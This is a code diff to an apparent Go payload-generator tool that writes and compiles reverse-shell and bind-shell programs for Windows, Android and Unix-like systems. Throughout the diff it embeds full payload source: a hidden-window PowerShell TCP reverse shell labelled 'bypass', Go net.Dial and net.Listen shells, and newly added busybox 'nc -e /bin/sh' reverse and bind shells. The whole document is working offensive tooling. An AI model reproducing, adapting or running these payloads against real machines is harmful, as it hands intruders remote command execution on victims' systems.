@@ -12,6 +12,7 @@ import (
 )
 
 var osOption, cmdORpwsh, archvar, bindORrev, tgtvar, shell, namefile, outfile, filecreated string
+var payload []byte
 
 const (
 	goos   = "GOOS"
@@ -33,7 +34,7 @@ func genfunc() {
 	if cmdORpwsh == "cmd" || cmdORpwsh == "C:\\Windows\\System32\\cmd.exe" {
 		shell = "C:\\Windows\\System32\\cmd.exe"
 	}
-	if cmdORpwsh == "/bin/sh" || cmdORpwsh == "/system/bin/sh" {
+	if cmdORpwsh == "/bin/sh" || cmdORpwsh == "/system/bin/sh" || cmdORpwsh == "/bin/busybox" {
 		shell = cmdORpwsh
 	}
 	if bindORrev == "bind" && cmdORpwsh == "bypass" {
@@ -41,25 +42,33 @@ func genfunc() {
 		os.Exit(0)
 	}
 	if cmdORpwsh == "bypass" {
-		bypass := []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar (\n\tcmd string\n)\nfunc main(){\n\tcmd = \"$socket = new-object System.Net.Sockets.TcpClient('" + addr + "', " + socket + ");if($socket -eq $null){exit 1};$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;do { $writer.Flush();$read = $null; $res = \\\"\\\";while($stream.DataAvailable -or $read -eq $null) {$read = $stream.Read($buffer, 0, 1024); };$out = $encoding.GetString($buffer, 0, $read).Replace(\\\"`r`n\\\",\\\"\\\").Replace(\\\"`n\\\",\\\"\\\");if(!$out.equals(\\\"exit\\\")){ $args = \\\"\\\";if($out.IndexOf(' ') -gt -1){$args = $out.substring($out.IndexOf(' ')+1);$out = $out.substring(0,$out.IndexOf(' '));if($args.split(' ').length -gt 1){$pinfo = New-Object System.Diagnostics.ProcessStartInfo;$pinfo.FileName = \\\"cmd.exe\\\"; $pinfo.RedirectStandardError = $true;$pinfo.RedirectStandardOutput = $true;$pinfo.UseShellExecute = $false;$pinfo.Arguments = \\\"/c $out $args\\\";$p = New-Object System.Diagnostics.Process;$p.StartInfo = $pinfo;$p.Start() | Out-Null;$p.WaitForExit();$stdout = $p.StandardOutput.ReadToEnd();$stderr = $p.StandardError.ReadToEnd();if ($p.ExitCode -ne 0) {$res = $stderr;} else {$res = $stdout;};} else { $res = (&\\\"$out\\\" \\\"$args\\\") | out-string;};} else {$res = (&\\\"$out\\\") | out-string;};if($res -ne $null){ $writer.WriteLine($res);};};} While (!$out.equals(\\\"exit\\\"));$writer.close();$socket.close();$stream.Dispose();\"\n\twincmd := exec.Command(\"C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"-windowstyle\", \"hidden\", cmd);\n\terr := wincmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}")
-		err := ioutil.WriteFile(namefile+".go", bypass, 0644)
-		if err != nil {
-			fmt.Println("Could not create file")
-		}
+		payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar (\n\tcmd string\n)\nfunc main(){\n\tcmd = \"$socket = new-object System.Net.Sockets.TcpClient('" + addr + "', " + socket + ");if($socket -eq $null){exit 1};$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;do { $writer.Flush();$read = $null; $res = \\\"\\\";while($stream.DataAvailable -or $read -eq $null) {$read = $stream.Read($buffer, 0, 1024); };$out = $encoding.GetString($buffer, 0, $read).Replace(\\\"`r`n\\\",\\\"\\\").Replace(\\\"`n\\\",\\\"\\\");if(!$out.equals(\\\"exit\\\")){ $args = \\\"\\\";if($out.IndexOf(' ') -gt -1){$args = $out.substring($out.IndexOf(' ')+1);$out = $out.substring(0,$out.IndexOf(' '));if($args.split(' ').length -gt 1){$pinfo = New-Object System.Diagnostics.ProcessStartInfo;$pinfo.FileName = \\\"cmd.exe\\\"; $pinfo.RedirectStandardError = $true;$pinfo.RedirectStandardOutput = $true;$pinfo.UseShellExecute = $false;$pinfo.Arguments = \\\"/c $out $args\\\";$p = New-Object System.Diagnostics.Process;$p.StartInfo = $pinfo;$p.Start() | Out-Null;$p.WaitForExit();$stdout = $p.StandardOutput.ReadToEnd();$stderr = $p.StandardError.ReadToEnd();if ($p.ExitCode -ne 0) {$res = $stderr;} else {$res = $stdout;};} else { $res = (&\\\"$out\\\" \\\"$args\\\") | out-string;};} else {$res = (&\\\"$out\\\") | out-string;};if($res -ne $null){ $writer.WriteLine($res);};};} While (!$out.equals(\\\"exit\\\"));$writer.close();$socket.close();$stream.Dispose();\"\n\twincmd := exec.Command(\"C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"-windowstyle\", \"hidden\", cmd);\n\terr := wincmd.Start()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}")
 	}
 	if bindORrev == "reverse" {
-		revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
-		err := ioutil.WriteFile(namefile+".go", revshell, 0644)
-		if err != nil {
-			fmt.Println("Could not create file")
-		}
+		payload = []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Start()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
 	}
 	if bindORrev == "bind" {
-		bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
-		err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
-		if err != nil {
-			fmt.Println("Could not create file")
+		payload = []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Start()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
+	}
+	if cmdORpwsh == "/bin/busybox" && osOption == "android" {
+		if bindORrev == "reverse" {
+			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar (\n\tcmd string\n)\nfunc main(){\n\tcmd = \"/system/bin/sh\"\n\tsyscmd := exec.Command(\"/system" + cmdORpwsh + "\", \"nc\", \"" + addr + "\", \"" + socket + "\", \"-e\", cmd)\n\terr := syscmd.Start()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
 		}
+		if bindORrev == "bind" {
+			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar (\n\tcmd string\n)\nfunc main(){\n\tcmd = \"/system/bin/sh\"\n\tsyscmd := exec.Command(\"/system" + cmdORpwsh + "\", \"nc\", \"-l\", \"" + addr + "\", \"-p\", \"" + socket + "\", \"-e\", cmd)\n\terr := syscmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
+		}
+	}
+	if cmdORpwsh == "/bin/busybox" && osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" || osOption == "darwin" {
+		if bindORrev == "reverse" {
+			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar (\n\tcmd string\n)\nfunc main(){\n\tcmd = \"/bin/sh\"\n\tsyscmd := exec.Command(\"" + cmdORpwsh + "\", \"nc\", \"" + addr + "\", \"" + socket + "\", \"-e\", cmd)\n\terr := syscmd.Start()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
+		}
+		if bindORrev == "bind" {
+			payload = []byte("package main\nimport (\n\t\"os/exec\"\n\t\"log\"\n)\nvar (\n\tcmd string\n)\nfunc main(){\n\tcmd = \"/bin/sh\"\n\tsyscmd := exec.Command(\"" + cmdORpwsh + "\", \"nc\", \"-l\", \"" + addr + "\", \"-p\", \"" + socket + "\", \"-e\", cmd)\n\terr := syscmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n")
+		}
+	}
+	err = ioutil.WriteFile(namefile+".go", payload, 0644)
+	if err != nil {
+		fmt.Println("Could not create file")
 	}
 	fmt.Println("Shell file created.")
 	cmd := exec.Command("go", "build", namefile+".go")
@@ -84,7 +93,7 @@ func genfunc() {
 	}
 	fmt.Println("Binary Created.")
 	if runtime.GOOS == "windows" {
-		showbin := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c dir")
+		showbin := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", "dir")
 		out1, err := showbin.CombinedOutput()
 		if err != nil {
 			fmt.Println("Could not run command.")
@@ -113,7 +122,7 @@ func genfunc() {
 
 func clifunc() {
 	flag.StringVar(&osOption, "p", "", "Operating System: windows, linux, freebsd, nacl, netbsd, openbsd, plan9, solaris, dragonfly, darwin, android")
-	flag.StringVar(&cmdORpwsh, "s", "", "Shell type: C:\\Windows\\System32\\cmd.exe, C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe, /bin/sh, /system/bin/sh, bypass")
+	flag.StringVar(&cmdORpwsh, "s", "", "Shell type: C:\\Windows\\System32\\cmd.exe, C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe, /bin/sh, /system/bin/sh, /bin/busybox, bypass")
 	flag.StringVar(&archvar, "a", "", "Architecture: 386, amd64, amd64p32, arm, arm64, ppc64, ppc64le, mips, mipsle, mips64, mips64le, s390x, sparc64")
 	flag.StringVar(&bindORrev, "t", "", "Payload type: bind/reverse")
 	flag.StringVar(&tgtvar, "l", "", "Listening host: <listening ip:port>")
